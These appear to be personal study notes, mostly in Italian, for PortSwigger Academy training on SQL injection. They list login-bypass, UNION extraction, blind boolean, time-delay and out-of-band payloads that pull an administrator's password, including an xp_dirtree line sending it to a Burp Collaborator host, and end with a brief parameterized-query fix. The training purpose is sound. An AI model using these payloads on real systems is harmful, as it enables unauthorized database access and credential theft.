FROM PORTSWIGGER ACADEMY - BURPSUITE CERTIFIED PREPARATION

SSTI
prova bypass filtro char alfanumerico con %0A

'"

SQL INJECTION
'
"
'"
generare errori!
' or 1=1--


detection: 
  '
  or 1=1 or 1=2 per triggherare errori maybe
  sql specific syntax
  payloads with delay
  OAST payloads per triggerare out of band network interactions  https://portswigger.net/blog/oast-out-of-band-application-security-testing

WHERE e SELECT sono i punti vulnerabili più frequenti. altri possono essere:

UPDATE -> sui valori da aggiornare
INSERT -> sui valori da inserire
SELECT -> sul nome colonna
SELECT -> su order by

-- per commentare il seguito e non eseguirlo
es. https://insecure-website.com/products?category=Gifts'--

SUBVERTING APP LOGIC
se per loggare mi chede username e password, io commento dopo l'username così non chiede la password nella query
es. administrator'--
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''

prendere dati da altre tabelle con UNION
' UNION SELECT username, password FROM users--

per union attacks ci sono 2 requisiti
1. conoscere il numero di colonne da chiamare
2. quali colonne della query originale sono suitable per contenere i risultati injectati dalla query

determinare il numero di colonne

' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
quando il numero eccede il numero di colonne da ritornare genera errore out of bound exception, errore generico, in alcuni casi errore http o altri casi no errori.

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

stessa cosa ma se il numero di null non matcha il numero di colonne viene sempre restituito errore
bisogna capire bene la versione del databse e seguire i comandi specifici per ogni caso

' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--

'+UNION+SELECT+'abc','def'--   -> find column number
SU ORACLE bisogna aggiungere +FROM+dual--

'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--   -> find table names
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--  -> find columns names of the table

utilizzabile per capire il tipo di dato, sperando che inserendo un char su un int generi errore

concatena con |cazzo| per ritornare due o più output sulla stessa colonna 

blind SQL injection
non ritorna errori o risultati evidenti
di solito si cerca di sovvertire la logica applicativa per restituire risultati diversi da quelli aspettati, o tramite boolean conditions, triggerare delay con le funzioni di timer oppure OAST per generare traffico sulla rete detectabile

di solito union attacks non funzionano con blind slq vulnerabilities
triggering conditional responses -> esempio: considerare un app che nelle richieste include dei tracking id -> Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4 -> SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
                                      …xyz' AND '1'='1
                                      …xyz' AND '1'='2

xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
check risposta per capire se la lettera della password è maggiora di t o minore, così facendo è possibile trovare la password

time delay
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--

time delay per trovare un carattere alla volta
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--

sui cookie non serve URL encoding

TrackingId=xyz' AND '1'='1 injection sui cookie
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a   -> boolean per confermare l'esistenza di una tabella chiamata users
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a     -> confermare l'esistenza dell'utente administrator nella tabella users
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a      -> determinare caratteri della password
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§     -> extract every character from the password and confront it with a character --> intruder cluster bomb attack per automatizzare
TrackingId=xyz' AND (SELECT SUBSTRING(password,§2§,1) FROM users WHERE username='administrator')='§a§    -> per la lunghezza della password

da provare per verificare il sistema
TrackingId=xyz'||(SELECT '' FROM dual)||'  -> oracle syntax
TrackingId=xyz'||(SELECT '')||'   -> sql syntax

TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'       -> importante tenere in considerazione WHERE ROWNUM in modo tale da non restituire più colonne e non rompere la concatenazione

TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'          -> test per verificare le condizioni  
                                                                                    -> condizione 1=1 vera sull'esempio genera un errore mentre 1=2 non genera errori, 
                                                                                        però poi l'errore viene generato dalla divisione per 0 (https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)

TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'        -> utilizzabile per verificare se delle entries esistono sul database
                                                                                                                                -> se la condizione è vera ricevo un errore
                                                                                                                                    -> administrator esiste

TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'      -> quanti caratteri ci sono sulla password di quell'utente

TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'     -> da quali caratteri è composta la password

OAST techniques
genera DNS query spesso
con collaborator si monta un dns server e ricevere le risposte
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--         -> per confermare che si possono fare richieste out of bound
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--    -> per mandare dati out of bound

SECOND ORDER SQL INJECTION

input viene salvato nel database e magari viene richiamato in altre funzioni ma non immediatamente, esempio stored xss
azione che viene eseguita con il payload caricato in precedenza tramite sqli

examining database version and stuff via specific commands and errors - consult cheatsheets such as https://portswigger.net/web-security/sql-injection/cheat-sheet and others

encode the payload in the way the requests are made, considering xml and json inputs

PREVENZIONE SQL INJECTION
query parametrizzate
esempio:

PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();

converti tutto a testo prima di eseguire 
